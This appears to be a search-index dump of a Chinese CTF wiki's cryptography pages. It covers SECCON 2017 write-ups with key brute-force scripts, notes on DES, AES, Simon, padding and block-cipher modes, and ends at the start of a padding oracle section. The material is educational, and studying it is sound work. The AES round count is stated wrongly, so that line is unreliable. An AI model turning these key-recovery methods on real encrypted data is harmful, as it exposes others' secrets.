\u6545\u800c\uff0c\u5176\u5b9e\u5bf9\u4e8e\u76f8\u540c\u7684\u660e\u6587\u6765\u8bf4\uff0c\u53ef\u80fd\u6709\u591a\u4e2a\u5bc6\u94a5\u4f7f\u5176\u751f\u6210\u76f8\u540c\u7684\u5bc6\u6587\u3002  \u7136\u800c\u4e0a\u9762\u5206\u6790\u5c31\u662f\u5355\u7eaf\u5730\u5206\u6790\u800c\u5df2\uff0c\uff0c\u4e0b\u9762\u5f00\u59cb\u6b63\u9898\u3002  \u4e0d\u96be\u770b\u51fa\uff0c\u5bc6\u6587\u7684\u6bcf\u4e00\u4f4d\u53ea\u4e0e\u660e\u6587\u7684\u76f8\u5e94\u4f4d\u76f8\u5173\uff0c\u800c\u4e14\uff0c\u5bc6\u94a5\u7684\u6bcf\u4e00\u4f4d\u7684\u7a7a\u95f4\u6700\u5927\u4e5f\u5c31\u662f s \u7684\u5927\u5c0f\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u7206\u7834\u6765\u83b7\u53d6\u5bc6\u94a5\u3002\u8fd9\u91cc\u6839\u636e\u4e0a\u8ff0\u547d\u4ee4\u884c\u63d0\u793a\uff0c\u53ef\u4ee5\u77e5\u9053\u5bc6\u94a5\u957f\u5ea6\u4e3a 14\uff0c\u6070\u597d\u660e\u6587\u524d\u97627\u4e2a\u5b57\u8282\u5df2\u77e5\u3002\u6062\u590d\u5bc6\u94a5\u7684 exp \u5982\u4e0b  def   get_key ( plain ,   cipher ): \n     s   =   ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_{} \n     t   =   [[ _l (( i   +   j )   %   len ( s ),   s )   for   j   in   range ( len ( s ))] \n          for   i   in   range ( len ( s ))] \n     i1   =   0 \n     i2   =   0 \n     key   =   [ * ]   *   14 \n     for   i   in   range ( len ( plain )): \n         for   i1   in   range ( len ( s )): \n             for   i2   in   range ( len ( s )): \n                 if   t [ s . find ( plain [ i ])][ s . find ( s [ i1 ])][ s . find ( s [ i2 ])]   ==   cipher [ \n                         i ]: \n                     key [ i ]   =   s [ i1 ] \n                     key [ 13   -   i ]   =   s [ i2 ] \n     return   . join ( key )   \u6062\u590d\u660e\u6587\u7684\u811a\u672c\u5982\u4e0b  def   decrypt ( cipher ,   k1 ,   k2 ): \n     s   =   ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_{} \n     t   =   [[ _l (( i   +   j )   %   len ( s ),   s )   for   j   in   range ( len ( s ))] \n          for   i   in   range ( len ( s ))] \n     i1   =   0 \n     i2   =   0 \n     plain   =   \n     for   a   in   cipher : \n         for   i   in   range ( len ( s )): \n             if   t [ i ][ s . find ( k1 [ i1 ])][ s . find ( k2 [ i2 ])]   ==   a : \n                 plain   +=   s [ i ] \n                 break \n         i1   =   ( i1   +   1 )   %   len ( k1 ) \n         i2   =   ( i2   +   1 )   %   len ( k2 ) \n     return   plain   \u5f97\u5230\u660e\u6587\u5982\u4e0b  \u279c  2017_seccon_vigenere3d git: ( master )  python exp.py\nSECCON { Welc0me_to_SECCON_CTF_2017 }", 
            "title": "2017 SECCON Vigenere3d"
        }, 
        {
            "location": "/crypto/symmetric/introduction/", 
            "text": "\u5bf9\u79f0\u52a0\u5bc6\n\n\n\u6240\u8c13\u5bf9\u79f0\u52a0\u5bc6\u5c31\u662f\u52a0\u5bc6\u5bc6\u94a5\u4e0e\u89e3\u5bc6\u5bc6\u94a5\u662f\u4e00\u6837\u7684\u52a0\u5bc6\u6a21\u5f0f\uff0c\u5728\u8fd9\u4e00\u9886\u57df\u5e38\u89c1\u7684\u4e3b\u8981\u6709\n\n\n\n\nRC4\u52a0\u5bc6\n\n\nDES\u52a0\u5bc6\n\n\nAES\u52a0\u5bc6", 
            "title": "\u5bf9\u79f0\u52a0\u5bc6\u7b80\u4ecb"
        }, 
        {
            "location": "/crypto/symmetric/introduction/#_1", 
            "text": "\u6240\u8c13\u5bf9\u79f0\u52a0\u5bc6\u5c31\u662f\u52a0\u5bc6\u5bc6\u94a5\u4e0e\u89e3\u5bc6\u5bc6\u94a5\u662f\u4e00\u6837\u7684\u52a0\u5bc6\u6a21\u5f0f\uff0c\u5728\u8fd9\u4e00\u9886\u57df\u5e38\u89c1\u7684\u4e3b\u8981\u6709   RC4\u52a0\u5bc6  DES\u52a0\u5bc6  AES\u52a0\u5bc6", 
            "title": "\u5bf9\u79f0\u52a0\u5bc6"
        }, 
        {
            "location": "/crypto/symmetric/des/", 
            "text": "DES\n\n\n\u57fa\u672c\u4ecb\u7ecd\n\n\nDES\u5168\u79f0\u4e3aData Encryption Standard\uff0c\u662f\u5178\u578b\u7684\u5757\u52a0\u5bc6\uff0c\u5176\u57fa\u672c\u4fe1\u606f\u5982\u4e0b\n\n\n\n\n\u4f7f\u752864\u4f4d\u5bc6\u94a5\u4e2d\u768456\u4f4d\uff0c\u5269\u4f59\u76848\u4f4d\u8981\u4e48\u4e22\u5f03\uff0c\u8981\u4e48\u4f5c\u4e3a\u5947\u5076\u6821\u9a8c\u4f4d\n\n\n\u8f93\u516564\u4f4d\n\n\n\u8f93\u51fa64\u4f4d\u3002\n\n\n\u660e\u6587\u7ecf\u8fc716\u8f6e\u8fed\u4ee3\u5f97\u5230\u5bc6\u6587\u3002\n\n\n\n\n\u7ed9\u51fa\u4e00\u5f20\u7b80\u5355\u7684\nDES \u6d41\u7a0b\u56fe\n \u3002\n\n\n\n\n\u518d\u7ed9\u4e00\u5f20\u6bd4\u8f83\u8be6\u7ec6\u7684\n\u56fe\n\u3002\n\n\n\n\n\u5176\u4e2d\n\n\n\n\nS\u76d2\u7684\u8bbe\u8ba1\u6807\u51c6\u5e76\u672a\u7ed9\u51fa\u3002", 
            "title": "DES"
        }, 
        {
            "location": "/crypto/symmetric/des/#des", 
            "text": "", 
            "title": "DES"
        }, 
        {
            "location": "/crypto/symmetric/des/#_1", 
            "text": "DES\u5168\u79f0\u4e3aData Encryption Standard\uff0c\u662f\u5178\u578b\u7684\u5757\u52a0\u5bc6\uff0c\u5176\u57fa\u672c\u4fe1\u606f\u5982\u4e0b   \u4f7f\u752864\u4f4d\u5bc6\u94a5\u4e2d\u768456\u4f4d\uff0c\u5269\u4f59\u76848\u4f4d\u8981\u4e48\u4e22\u5f03\uff0c\u8981\u4e48\u4f5c\u4e3a\u5947\u5076\u6821\u9a8c\u4f4d  \u8f93\u516564\u4f4d  \u8f93\u51fa64\u4f4d\u3002  \u660e\u6587\u7ecf\u8fc716\u8f6e\u8fed\u4ee3\u5f97\u5230\u5bc6\u6587\u3002   \u7ed9\u51fa\u4e00\u5f20\u7b80\u5355\u7684 DES \u6d41\u7a0b\u56fe  \u3002   \u518d\u7ed9\u4e00\u5f20\u6bd4\u8f83\u8be6\u7ec6\u7684 \u56fe \u3002   \u5176\u4e2d   S\u76d2\u7684\u8bbe\u8ba1\u6807\u51c6\u5e76\u672a\u7ed9\u51fa\u3002", 
            "title": "\u57fa\u672c\u4ecb\u7ecd"
        }, 
        {
            "location": "/crypto/symmetric/aes/", 
            "text": "AES\n\n\n\u57fa\u672c\u4ecb\u7ecd\n\n\nAES\u5168\u79f0\u4e3aAdvanced Encryption Standard\uff0c\u662f\u5178\u578b\u7684\u5757\u52a0\u5bc6\uff0c\u88ab\u8bbe\u8ba1\u6765\u53d6\u4ee3DES\u3002\u5176\u57fa\u672c\u4fe1\u606f\u5982\u4e0b\n\n\n\n\n\u5206\u7ec4\u957f\u5ea6\u548c\u5bc6\u94a5\u957f\u5ea6\u5747\u53ef\u53d8\uff0c\u53ef\u4ee5\u6709\u4ee5\u4e0b\u51e0\u79cd\u6570\u503c\n\n\n128\u6bd4\u7279\n\n\n192\u6bd4\u7279\n\n\n256\u6bd4\u7279\n\n\n\u660e\u6587\u7ecf\u8fc710\u8f6e\u8fed\u4ee3\u5f97\u5230\u5bc6\u6587\u3002\n\n\n\n\n\u7ed9\u4e2a\u770b\u96ea\u4e0a\u6bd4\u8f83\u597d\u7684\n\u56fe\u4f8b\n \u3002", 
            "title": "AES"
        }, 
        {
            "location": "/crypto/symmetric/aes/#aes", 
            "text": "", 
            "title": "AES"
        }, 
        {
            "location": "/crypto/symmetric/aes/#_1", 
            "text": "AES\u5168\u79f0\u4e3aAdvanced Encryption Standard\uff0c\u662f\u5178\u578b\u7684\u5757\u52a0\u5bc6\uff0c\u88ab\u8bbe\u8ba1\u6765\u53d6\u4ee3DES\u3002\u5176\u57fa\u672c\u4fe1\u606f\u5982\u4e0b   \u5206\u7ec4\u957f\u5ea6\u548c\u5bc6\u94a5\u957f\u5ea6\u5747\u53ef\u53d8\uff0c\u53ef\u4ee5\u6709\u4ee5\u4e0b\u51e0\u79cd\u6570\u503c  128\u6bd4\u7279  192\u6bd4\u7279  256\u6bd4\u7279  \u660e\u6587\u7ecf\u8fc710\u8f6e\u8fed\u4ee3\u5f97\u5230\u5bc6\u6587\u3002   \u7ed9\u4e2a\u770b\u96ea\u4e0a\u6bd4\u8f83\u597d\u7684 \u56fe\u4f8b  \u3002", 
            "title": "\u57fa\u672c\u4ecb\u7ecd"
        }, 
        {
            "location": "/crypto/symmetric/simon-speck/", 
            "text": "Simon and Speck Block Ciphers\n\n\n\u8fd9\u662f\u4e00\u7ec4\u59d0\u59b9\u8f7b\u91cf\u7ea7\u52a0\u5bc6\u3002\n\n\nSimon Block Cipher\n\n\n\u57fa\u672c\u4ecb\u7ecd\n\n\nSimon \u5757\u52a0\u5bc6\u7b97\u6cd5\u7531 NSA 2013 \u5e74 6 \u6708\u516c\u5e03\uff0c\u4e3b\u8981\u5728\n\u786c\u4ef6\u5b9e\u73b0\n\u4e0a\u8fdb\u884c\u4e86\u4f18\u5316\u3002\n\n\nSimon Block Cipher \u662f\u5e73\u8861\u7684 \nFeistel cipher\n \u52a0\u5bc6\uff0c\u4e00\u5171\u6709\u4e24\u5757\uff0c\u82e5\u6bcf\u5757\u52a0\u5bc6\u7684\u5927\u5c0f\u4e3a n bits\uff0c\u90a3\u4e48\u660e\u6587\u7684\u5927\u5c0f\u5c31\u662f 2n bits\u3002\u6b64\u5916\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u8be5\u52a0\u5bc6\u4e2d\u6240\u4f7f\u7528\u7684\u5bc6\u94a5\u957f\u5ea6\u662f\u5757\u957f\u5ea6\u7684\u6574\u6570\u500d\uff0c\u6bd4\u5982 2n\uff0c4n\u7b49\u3002\u5e38\u89c1\u7684 Simon \u52a0\u5bc6\u7b97\u6cd5\u6709\n\n\n\n\n\u4e00\u822c\u6765\u8bf4\uff0cSimon \u7b97\u6cd5\u79f0\u4e4b\u4e3a  Simon 2\nn\n/nm\uff0cn \u4e3a\u5757\u5927\u5c0f\uff0cm \u662f\u5757\u5927\u5c0f\u4e0e\u5bc6\u94a5\u4e4b\u95f4\u7684\u500d\u6570\u3002\u6bd4\u5982\u8bf4 Simon 48/96 \u5c31\u662f\u6307\u660e\u6587\u662f 48 \u6bd4\u7279\uff0c\u5bc6\u94a5\u662f 96 \u6bd4\u7279\u7684\u52a0\u5bc6\u7b97\u6cd5\u3002\n\n\n\u6b64\u5916\uff0c\u5bf9\u4e8e Simon \u5757\u52a0\u5bc6\u7b97\u6cd5\u6765\u8bf4\uff0c\u6bcf\u8f6e\u7684\u52a0\u5bc6\u8fc7\u7a0b\u4e00\u6837\uff0c\u5982\u4e0b\n\n\n\n\n\u5f53\u7136\uff0c\u5bf9\u4e8e\u6bcf\u4e00\u8f6e\u4ee5\u53ca\u4e0d\u540c\u7684 m \u6765\u8bf4\uff0c\u5bc6\u94a5\u4e5f\u4f1a\u6709\u6240\u4e0d\u540c\n\n\n\n\n\u5176\u4e2d\uff0c \nz_j\nz_j\n \u662f\u7531 Linear Feedback Shift Register (LFSR) \u751f\u6210\u7684\uff0c\u867d\u7136\u5bf9\u4e8e\u4e0d\u540c\u7684 \nz_j\nz_j\n \u7684\u903b\u8f91\u4e0d\u540c\uff0c\u4f46\u662f\u521d\u59cb\u5411\u91cf\u662f\u56fa\u5b9a\u7684\u3002\n\n\n\n\n\n\n\n\nConstant\n\n\n\n\n\n\n\n\n\n\nz_{0}\nz_{0}\n=11111010001001010110000111001101111101000100101011000011100110\n\n\n\n\n\n\nz_{1}\nz_{1}\n=10001110111110010011000010110101000111011111001001100001011010\n\n\n\n\n\n\nz_{2}\nz_{2}\n=10101111011100000011010010011000101000010001111110010110110011\n\n\n\n\n\n\nz_{3}\nz_{3}\n=11011011101011000110010111100000010010001010011100110100001111\n\n\n\n\n\n\nz_{4}\nz_{4}\n=11010001111001101011011000100000010111000011001010010011101111\n\n\n\n\n\n\n\n\n2017 SECCON Simon and Speck Block Ciphers\n\n\n\u9898\u76ee\u63cf\u8ff0\u5982\u4e0b\n\n\nSimon and Speck Block Ciphers\n\nhttps://eprint.iacr.org/2013/404.pdf Simon_96_64, ECB, key=\nSECCON{xxxx}\n, plain=0x6d564d37426e6e71, cipher=0xbb5d12ba422834b5\n\n\n\n\n\u4ece\u540d\u5b57\u4e2d\u53ef\u4ee5\u770b\u51fa\u5bc6\u94a5\u662f 96 \u6bd4\u7279\uff0812 byte\uff09\uff0c\u660e\u6587\u662f 64 \u6bd4\u7279\uff088\u5b57\u8282\uff09\uff0c\u800c\u5bc6\u94a5\u5df2\u7ecf\u7ed9\u51fa\u4e86 8 \u4e2a\u5b57\u8282\uff0c\u53ea\u5269\u4e0b\u56db\u4e2a\u5b57\u8282\u672a\u77e5\u3002\u90a3\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u66b4\u529b\u7834\u89e3\u7684\u65b9\u6cd5\u3002\u8fd9\u91cc\u4ece \nhttps://github.com/bozhu/NSA-ciphers/blob/master/simon.py\n \u83b7\u53d6\u4e86\u4e00\u4efd simon \u52a0\u5bc6\u7b97\u6cd5\u3002\n\n\n\u5177\u4f53\u5982\u4e0b\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nfrom\n \nsimon\n \nimport\n \nSIMON\n\n\n\nplain\n \n=\n \n0x6d564d37426e6e71\n\n\ncipher\n \n=\n \n0xbb5d12ba422834b5\n\n\n\n\ndef\n \ncompare\n(\nkey\n):\n\n    \nkey\n \n=\n \nSECCON{\n \n+\n \nkey\n \n+\n \n}\n\n    \nkey\n \n=\n \nkey\n.\nencode\n(\nhex\n)\n\n    \nkey\n \n=\n \nint\n(\nkey\n,\n \n16\n)\n\n    \nmy_simon\n \n=\n \nSIMON\n(\n64\n,\n \n96\n,\n \nkey\n)\n\n    \ntest\n \n=\n \nmy_simon\n.\nencrypt\n(\nplain\n)\n\n    \nif\n \ntest\n \n==\n \ncipher\n:\n\n        \nreturn\n \nTrue\n\n    \nelse\n:\n\n        \nreturn\n \nFalse\n\n\n\n\ndef\n \nsolve\n():\n\n    \nvisible\n \n=\n \nstring\n.\nuppercase\n \n+\n \nstring\n.\nlowercase\n \n+\n \nstring\n.\ndigits\n \n+\n \nstring\n.\npunctuation\n \n+\n \n \n\n    \nkey\n \n=\n \npwnlib\n.\nutil\n.\niters\n.\nmbruteforce\n(\ncompare\n,\n \nvisible\n,\n \n4\n,\n \nmethod\n=\nfixed\n)\n\n    \nprint\n \nkey\n\n\n\n\nif\n \n__name__\n \n==\n \n__main__\n:\n\n    \nsolve\n()\n\n\n\n\n\n\u7ed3\u679c\u5982\u4e0b\n\n\n\u279c  2017_seccon_simon_and_speck_block_ciphers git:\n(\nmaster\n)\n python exp.py\n\n[\n+\n]\n MBruteforcing: Found key: \n6Pz0\n\n\n\n\n\n\u53c2\u8003\u6587\u732e\n\n\n\n\nhttps://en.wikipedia.org/wiki/Simon_(cipher\n)", 
            "title": "Simon and Speck"
        }, 
        {
            "location": "/crypto/symmetric/simon-speck/#simon-and-speck-block-ciphers", 
            "text": "\u8fd9\u662f\u4e00\u7ec4\u59d0\u59b9\u8f7b\u91cf\u7ea7\u52a0\u5bc6\u3002", 
            "title": "Simon and Speck Block Ciphers"
        }, 
        {
            "location": "/crypto/symmetric/simon-speck/#simon-block-cipher", 
            "text": "", 
            "title": "Simon Block Cipher"
        }, 
        {
            "location": "/crypto/symmetric/simon-speck/#_1", 
            "text": "Simon \u5757\u52a0\u5bc6\u7b97\u6cd5\u7531 NSA 2013 \u5e74 6 \u6708\u516c\u5e03\uff0c\u4e3b\u8981\u5728 \u786c\u4ef6\u5b9e\u73b0 \u4e0a\u8fdb\u884c\u4e86\u4f18\u5316\u3002  Simon Block Cipher \u662f\u5e73\u8861\u7684  Feistel cipher  \u52a0\u5bc6\uff0c\u4e00\u5171\u6709\u4e24\u5757\uff0c\u82e5\u6bcf\u5757\u52a0\u5bc6\u7684\u5927\u5c0f\u4e3a n bits\uff0c\u90a3\u4e48\u660e\u6587\u7684\u5927\u5c0f\u5c31\u662f 2n bits\u3002\u6b64\u5916\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u8be5\u52a0\u5bc6\u4e2d\u6240\u4f7f\u7528\u7684\u5bc6\u94a5\u957f\u5ea6\u662f\u5757\u957f\u5ea6\u7684\u6574\u6570\u500d\uff0c\u6bd4\u5982 2n\uff0c4n\u7b49\u3002\u5e38\u89c1\u7684 Simon \u52a0\u5bc6\u7b97\u6cd5\u6709   \u4e00\u822c\u6765\u8bf4\uff0cSimon \u7b97\u6cd5\u79f0\u4e4b\u4e3a  Simon 2 n /nm\uff0cn \u4e3a\u5757\u5927\u5c0f\uff0cm \u662f\u5757\u5927\u5c0f\u4e0e\u5bc6\u94a5\u4e4b\u95f4\u7684\u500d\u6570\u3002\u6bd4\u5982\u8bf4 Simon 48/96 \u5c31\u662f\u6307\u660e\u6587\u662f 48 \u6bd4\u7279\uff0c\u5bc6\u94a5\u662f 96 \u6bd4\u7279\u7684\u52a0\u5bc6\u7b97\u6cd5\u3002  \u6b64\u5916\uff0c\u5bf9\u4e8e Simon \u5757\u52a0\u5bc6\u7b97\u6cd5\u6765\u8bf4\uff0c\u6bcf\u8f6e\u7684\u52a0\u5bc6\u8fc7\u7a0b\u4e00\u6837\uff0c\u5982\u4e0b   \u5f53\u7136\uff0c\u5bf9\u4e8e\u6bcf\u4e00\u8f6e\u4ee5\u53ca\u4e0d\u540c\u7684 m \u6765\u8bf4\uff0c\u5bc6\u94a5\u4e5f\u4f1a\u6709\u6240\u4e0d\u540c   \u5176\u4e2d\uff0c  z_j z_j  \u662f\u7531 Linear Feedback Shift Register (LFSR) \u751f\u6210\u7684\uff0c\u867d\u7136\u5bf9\u4e8e\u4e0d\u540c\u7684  z_j z_j  \u7684\u903b\u8f91\u4e0d\u540c\uff0c\u4f46\u662f\u521d\u59cb\u5411\u91cf\u662f\u56fa\u5b9a\u7684\u3002     Constant      z_{0} z_{0} =11111010001001010110000111001101111101000100101011000011100110    z_{1} z_{1} =10001110111110010011000010110101000111011111001001100001011010    z_{2} z_{2} =10101111011100000011010010011000101000010001111110010110110011    z_{3} z_{3} =11011011101011000110010111100000010010001010011100110100001111    z_{4} z_{4} =11010001111001101011011000100000010111000011001010010011101111", 
            "title": "\u57fa\u672c\u4ecb\u7ecd"
        }, 
        {
            "location": "/crypto/symmetric/simon-speck/#2017-seccon-simon-and-speck-block-ciphers", 
            "text": "\u9898\u76ee\u63cf\u8ff0\u5982\u4e0b  Simon and Speck Block Ciphers\n\nhttps://eprint.iacr.org/2013/404.pdf Simon_96_64, ECB, key= SECCON{xxxx} , plain=0x6d564d37426e6e71, cipher=0xbb5d12ba422834b5  \u4ece\u540d\u5b57\u4e2d\u53ef\u4ee5\u770b\u51fa\u5bc6\u94a5\u662f 96 \u6bd4\u7279\uff0812 byte\uff09\uff0c\u660e\u6587\u662f 64 \u6bd4\u7279\uff088\u5b57\u8282\uff09\uff0c\u800c\u5bc6\u94a5\u5df2\u7ecf\u7ed9\u51fa\u4e86 8 \u4e2a\u5b57\u8282\uff0c\u53ea\u5269\u4e0b\u56db\u4e2a\u5b57\u8282\u672a\u77e5\u3002\u90a3\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u66b4\u529b\u7834\u89e3\u7684\u65b9\u6cd5\u3002\u8fd9\u91cc\u4ece  https://github.com/bozhu/NSA-ciphers/blob/master/simon.py  \u83b7\u53d6\u4e86\u4e00\u4efd simon \u52a0\u5bc6\u7b97\u6cd5\u3002  \u5177\u4f53\u5982\u4e0b  from   pwn   import   *  from   simon   import   SIMON  plain   =   0x6d564d37426e6e71  cipher   =   0xbb5d12ba422834b5  def   compare ( key ): \n     key   =   SECCON{   +   key   +   } \n     key   =   key . encode ( hex ) \n     key   =   int ( key ,   16 ) \n     my_simon   =   SIMON ( 64 ,   96 ,   key ) \n     test   =   my_simon . encrypt ( plain ) \n     if   test   ==   cipher : \n         return   True \n     else : \n         return   False  def   solve (): \n     visible   =   string . uppercase   +   string . lowercase   +   string . digits   +   string . punctuation   +     \n     key   =   pwnlib . util . iters . mbruteforce ( compare ,   visible ,   4 ,   method = fixed ) \n     print   key  if   __name__   ==   __main__ : \n     solve ()   \u7ed3\u679c\u5982\u4e0b  \u279c  2017_seccon_simon_and_speck_block_ciphers git: ( master )  python exp.py [ + ]  MBruteforcing: Found key:  6Pz0", 
            "title": "2017 SECCON Simon and Speck Block Ciphers"
        }, 
        {
            "location": "/crypto/symmetric/simon-speck/#_2", 
            "text": "https://en.wikipedia.org/wiki/Simon_(cipher )", 
            "title": "\u53c2\u8003\u6587\u732e"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/", 
            "text": "\u5206\u7ec4\u6a21\u5f0f\n\n\n\u5206\u7ec4\u52a0\u5bc6\u4f1a\u5c06\u660e\u6587\u6d88\u606f\u5212\u5206\u4e3a\u56fa\u5b9a\u5927\u5c0f\u7684\u5757\uff0c\u6bcf\u5757\u660e\u6587\u5206\u522b\u5728\u5bc6\u94a5\u63a7\u5236\u4e0b\u52a0\u5bc6\u4e3a\u5bc6\u6587\u3002\u5f53\u7136\u5e76\u4e0d\u662f\u6bcf\u4e2a\u6d88\u606f\u90fd\u662f\u76f8\u5e94\u5757\u5927\u5c0f\u7684\u6574\u6570\u500d\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u80fd\u9700\u8981\u8fdb\u884c\u586b\u5145\u3002\n\n\n\u5e38\u89c1\u586b\u5145\u89c4\u5219\n\n\n\u6b63\u5982\u6211\u4eec\u4e4b\u524d\u6240\u8bf4\uff0c\u5728\u5206\u7ec4\u52a0\u5bc6\u4e2d\uff0c\u660e\u6587\u7684\u957f\u5ea6\u5f80\u5f80\u5e76\u4e0d\u6ee1\u8db3\u8981\u6c42\uff0c\u9700\u8981\u8fdb\u884c padding\uff0c\u800c\u5982\u4f55 padding \u76ee\u524d\u4e5f\u5df2\u7ecf\u6709\u4e86\u4e0d\u5c11\u7684\u89c4\u5b9a\u3002\n\n\n\u5e38\u89c1\u7684 \n\u586b\u5145\u89c4\u5219\n \u5982\u4e0b\u3002\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5373\u4f7f\u6d88\u606f\u7684\u957f\u5ea6\u662f\u5757\u5927\u5c0f\u7684\u6574\u6570\u500d\uff0c\u4ecd\u7136\u9700\u8981\u586b\u5145\u3002\n\n\n\u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u5728\u89e3\u5bc6\u4e4b\u540e\u53d1\u73b0 Padding \u4e0d\u6b63\u786e\uff0c\u5219\u5f80\u5f80\u4f1a\u629b\u51fa\u5f02\u5e38\u3002\u6211\u4eec\u4e5f\u56e0\u6b64\u53ef\u4ee5\u77e5\u9053 Paddig \u662f\u5426\u6b63\u786e\u3002\n\n\nPad with bytes all of the same value as the number of padding bytes (PKCS5 padding)\n\n\n\u4e3e\u4f8b\u5b50\u5982\u4e0b\n\n\nDES INPUT BLOCK  = f  o  r  _  _  _  _  _\n(IN HEX)           66 6F 72 05 05 05 05 05\nKEY              = 01 23 45 67 89 AB CD EF\nDES OUTPUT BLOCK = FD 29 85 C9 E8 DF 41 40\n\n\n\n\nPad with 0x80 followed by zero bytes (OneAndZeroes Padding)\n\n\n\u4e3e\u4f8b\u5b50\u5982\u4e0b\n\n\nDES INPUT BLOCK  = f  o  r  _  _  _  _  _\n(IN HEX)           66 6F 72 80 00 00 00 00\nKEY              = 01 23 45 67 89 AB CD EF\nDES OUTPUT BLOCK = BE 62 5D 9F F3 C6 C8 40\n\n\n\n\n\u8fd9\u91cc\u5176\u5b9e\u5c31\u662f\u548c md5 \u548c sha1 \u7684 padding \u5dee\u4e0d\u591a\u3002\n\n\nPad with zeroes except make the last byte equal to the number of padding bytes\n\n\n\u4e3e\u4f8b\u5b50\u5982\u4e0b\n\n\nDES INPUT BLOCK  = f  o  r  _  _  _  _  _\n(IN HEX)           66 6f 72 00 00 00 00 05\nKEY              = 01 23 45 67 89 AB CD EF\nDES OUTPUT BLOCK = 91 19 2C 64 B5 5C 5D B8\n\n\n\n\nPad with zero (null) characters\n\n\n\u4e3e\u4f8b\u5b50\u5982\u4e0b\n\n\nDES INPUT BLOCK  = f  o  r  _  _  _  _  _\n(IN HEX)           66 6f 72 00 00 00 00 00\nKEY              = 01 23 45 67 89 AB CD EF\nDES OUTPUT BLOCK = 9E 14 FB 96 C5 FE EB 75\n\n\n\n\nPad with spaces\n\n\n\u4e3e\u4f8b\u5b50\u5982\u4e0b\n\n\nDES INPUT BLOCK  = f  o  r  _  _  _  _  _\n(IN HEX)           66 6f 72 20 20 20 20 20\nKEY              = 01 23 45 67 89 AB CD EF\nDES OUTPUT BLOCK = E3 FF EC E5 21 1F 35 25\n\n\n\n\nECB\n\n\nECB\u6a21\u5f0f\u5168\u79f0\u4e3a\u7535\u5b50\u5bc6\u7801\u672c\u6a21\u5f0f\uff08Electronic codebook\uff09\u3002\n\n\n\u52a0\u5bc6\n\n\n\n\n\u89e3\u5bc6\n\n\n\n\n\u7f3a\u70b9\n\n\n\n\n\u540c\u6837\u7684\u660e\u6587\u5757\u4f1a\u88ab\u52a0\u5bc6\u6210\u76f8\u540c\u7684\u5bc6\u6587\u5757\n\n\n\n\nCBC\n\n\nCBC\u5168\u79f0\u4e3a\u5bc6\u7801\u5206\u7ec4\u94fe\u63a5\uff08Cipher-block chaining\uff09 \u6a21\u5f0f\u3002\n\n\n\u52a0\u5bc6\n\n\n\n\n\u89e3\u5bc6\n\n\n\n\n\u7279\u70b9\n\n\n\n\n\u5bc6\u6587\u5757\u4e2d\u7684\u4e00\u4f4d\u53d8\u5316\u53ea\u4f1a\u5f71\u54cd\u5f53\u524d\u5bc6\u6587\u5757\u548c\u4e0b\u4e00\u5bc6\u6587\u5757\u3002\n\n\n\u52a0\u5bc6\u8fc7\u7a0b\u96be\u4ee5\u5e76\u884c\u5316\n\n\n\n\n\u653b\u51fb\n\n\n\n\n\u5b57\u8282\u53cd\u8f6c\u653b\u51fb\n\n\nIV \u5411\u91cf\uff0c\u5f71\u54cd\u7b2c\u4e00\u4e2a\u660e\u6587\u5206\u7ec4\n\n\n\u7b2c n \u4e2a\u5bc6\u6587\u5206\u7ec4\uff0c\u5f71\u54cd\u7b2c n + 1 \u4e2a\u660e\u6587\u5206\u7ec4\n\n\n\n\n\n\nPadding Oracle Attack\uff0c\u5177\u4f53\u53c2\u89c1\u4e0b\u9762\u4ecb\u7ecd\u3002\n\n\n\n\nPCBC\n\n\nPCBC\u7684\u5168\u79f0\u4e3a\u660e\u6587\u5bc6\u7801\u5757\u94fe\u63a5\uff08Plaintext cipher-block chaining\uff09\u3002\u4e5f\u79f0\u4e3a\u586b\u5145\u5bc6\u7801\u5757\u94fe\u63a5\uff08Propagating cipher-block chaining\uff09\u3002\n\n\n\u52a0\u5bc6\n\n\n\n\n\u89e3\u5bc6\n\n\n\n\n\u7279\u70b9\n\n\n\n\n\u89e3\u5bc6\u8fc7\u7a0b\u96be\u4ee5\u5e76\u884c\u5316\n\n\n\u4e92\u6362\u90bb\u63a5\u7684\u5bc6\u6587\u5757\u4e0d\u4f1a\u5bf9\u540e\u9762\u7684\u5bc6\u6587\u5757\u9020\u6210\u5f71\u54cd\n\n\n\n\nCFB\n\n\nCFB\u5168\u79f0\u4e3a\u5bc6\u6587\u53cd\u9988\u6a21\u5f0f\uff08Cipher feedback\uff09\u3002\n\n\n\u52a0\u5bc6\n\n\n\n\n\u89e3\u5bc6\n\n\n\n\n\u7279\u70b9\n\n\n\n\n\u52a0\u89e3\u5bc6\u5747\u4e0d\u80fd\u5e76\u884c\u5316\u3002\n\n\n\n\n\u653b\u51fb\n\n\n\n\nHITCONCTF-Quals-2015-Simple-(Crypto-100)\n\n\n\n\nOFB\n\n\nOFB\u5168\u79f0\u4e3a\u8f93\u51fa\u53cd\u9988\u6a21\u5f0f\uff08Output feedback\uff09\u3002\n\n\n\u52a0\u5bc6\n\n\n\n\n\u89e3\u5bc6\n\n\n\n\nCTR\n\n\nCTR\u5168\u79f0\u4e3a\u8ba1\u6570\u5668\u6a21\u5f0f\uff08Counter mode\uff09\u3002\n\n\n\u52a0\u5bc6\n\n\n\n\n\u89e3\u5bc6\n\n\n\n\nPadding Oracle Attack\n\n\n\u4ecb\u7ecd\n\n\nPadding Oracle Attack \u653b\u51fb\u4e00\u822c\u9700\u8981\u6ee1\u8db3\u4ee5\u4e0b\u51e0\u4e2a\u6761\u4ef6\n\n\n\n\n\u52a0\u5bc6\u7b97\u6cd5\n\n\n\u91c7\u7528 PKCS5 Padding \u7684\u52a0\u5bc6\u7b97\u6cd5\u3002 \u5f53\u7136\uff0c\u975e\u5bf9\u79f0\u52a0\u5bc6\u4e2d OAEP 